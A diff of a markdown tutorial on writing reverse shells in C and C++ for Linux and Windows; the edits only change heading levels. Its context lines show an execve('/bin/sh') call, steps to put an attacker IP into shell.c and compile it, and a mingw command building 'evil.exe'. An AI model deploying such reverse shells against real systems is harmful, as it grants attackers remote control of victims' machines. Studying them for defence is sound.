@@ -83,7 +83,7 @@ int main () {
 }
 ```
 
-## Explanation
+### Explanation
 ---
 ```C
 #include <stdio.h>
@@ -703,7 +703,7 @@ execve("/bin/sh", NULL, NULL);
     ```
 	The shell’s **input/output/error** go through the **network socket**!
 ---
-### Run Command
+## Run Command
 
 **Attacker's Machine** : Create `shell.c`- paste the above code and replace your attacker's ip with 192.168.0.108 in 8ᵗʰ line.
 **Attacker's Machine** : `gcc -o shell shell.c -w`
@@ -714,7 +714,7 @@ execve("/bin/sh", NULL, NULL);
 
 ![[images/Pasted image 20250425161105.png]]
 
-# 6. Reverse Shell in C for Windows
+# 6. Reverse Shell in C++ for Windows
 ---
 **On attacker's Machine run:** 
 ```bash
@@ -831,7 +831,7 @@ int main(void) {
 
 ```
 
-## Explanation
+### Explanation
 ---
 ```C
 #include <windows.h>
@@ -1171,11 +1171,12 @@ WaitForSingleObject(th, -1);
 
 ---
 
-### Let's Compile
+## Let's Compile
 
 **On Attackers' Machine:** `x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
 ![[images/Pasted image 20250426162740.png]]
 
+## Run command
 ### Start listener on Attacker's Machine
 
 ```shell
